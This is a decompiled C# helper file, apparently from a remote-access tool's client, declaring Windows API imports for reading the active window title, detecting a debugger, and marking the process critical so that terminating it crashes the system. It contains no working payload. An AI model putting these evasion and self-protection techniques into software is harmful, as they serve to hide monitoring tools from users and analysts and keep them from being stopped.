using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Helper
{
	// Token: 0x0200000B RID: 11
	public static class NativeMethods
	{
		// Token: 0x06000038 RID: 56
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x06000039 RID: 57
		[DllImport("user32.dll")]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		// Token: 0x0600003A RID: 58
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x0600003B RID: 59
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		// Token: 0x0600003C RID: 60
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern NativeMethods.EXECUTION_STATE SetThreadExecutionState(NativeMethods.EXECUTION_STATE esFlags);

		// Token: 0x0600003D RID: 61
		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

		// Token: 0x0200000C RID: 12
		public enum EXECUTION_STATE : uint
		{
			// Token: 0x04000020 RID: 32
			ES_CONTINUOUS = 2147483648U,
			// Token: 0x04000021 RID: 33
			ES_DISPLAY_REQUIRED = 2U,
			// Token: 0x04000022 RID: 34
			ES_SYSTEM_REQUIRED = 1U
		}
	}
}
